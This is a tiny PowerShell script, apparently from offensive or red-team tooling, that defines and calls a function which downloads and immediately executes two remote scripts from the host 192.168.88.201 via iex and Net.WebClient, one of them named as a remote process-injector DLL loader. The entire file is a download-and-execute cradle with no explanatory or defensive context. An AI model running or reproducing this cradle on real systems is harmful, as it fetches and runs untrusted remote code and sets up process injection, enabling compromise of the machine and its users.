function load_dlls{
    iex(new-object net.webclient).downloadString('http://192.168.88.201/custom-script.ps1')
    iex(new-object net.webclient).downloadString('http://192.168.88.201/load_remote_process_injector_dll.ps1')    
}
load_dlls